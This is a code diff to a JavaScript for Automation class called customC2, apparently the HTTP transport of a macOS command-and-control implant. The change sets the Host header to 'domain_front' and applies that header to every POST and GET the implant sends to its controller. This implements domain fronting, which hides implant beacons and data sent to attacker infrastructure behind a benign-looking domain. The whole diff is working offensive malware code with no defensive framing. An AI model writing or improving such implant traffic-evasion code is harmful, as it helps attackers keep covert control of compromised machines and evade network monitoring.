@@ -9,7 +9,7 @@ class customC2 extends baseC2{
         this.post_new_callback = "NEWCALLBACK";
         this.post_response = "POSTRESPONSE";
         this.id_field = "IDSTRING";
-        this.host_header = "YYY";
+        this.host_header = "domain_front";
 	}
 	getRandomMixed(size){
 	    return [...Array(size)].map(i=>(~~(Math.random()*36)).toString(36)).join('');
@@ -139,7 +139,7 @@ class customC2 extends baseC2{
 				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
 				var postLength = $.NSString.stringWithFormat("%d", postData.length);
 				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
-				if( this.host_header.length > 3){
+				if( this.host_header.length > 0){
 				    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
 				}
 				req.setHTTPBody(postData);
@@ -161,7 +161,7 @@ class customC2 extends baseC2{
 	        try{
 	            var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
                 req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
-                if( this.host_header.length > 3){
+                if( this.host_header.length > 0){
                     req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
                 }
                 var response = Ref();
